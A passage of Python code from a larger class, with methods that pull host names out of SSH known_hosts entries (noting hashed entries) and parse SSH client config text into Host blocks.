            if host_field.startswith("|1|"):
                # HMAC-hashed entry — actual hostname is not recoverable
                hosts.append("[hashed-entry]")
            else:
                for h in host_field.split(","):
                    h = h.strip()
                    if h:
                        hosts.append(h)
        # Deduplicate while preserving order
        seen: set = set()
        unique: List[str] = []
        for h in hosts:
            if h not in seen:
                seen.add(h)
                unique.append(h)
        return unique

    def _parse_ssh_client_config(self, content: str) -> List[Dict[str, str]]:
        """Parse an SSH client config file into a list of Host block dicts."""
        host_blocks: List[Dict[str, str]] = []
        current: Dict[str, str] = {}
        for line in content.splitlines():
            stripped = line.strip()
            if not stripped or stripped.startswith("#"):
                continue
            parts = stripped.split(None, 1)
            if not parts:
                continue
            key = parts[0]
            val = parts[1] if len(parts) > 1 else ""
            if key.lower() == "host":
                if current:
                    host_blocks.append(current)
                current = {"Host": val}
            elif current:
                current[key] = val
        if current:
            host_blocks.append(current)
        return host_blocks
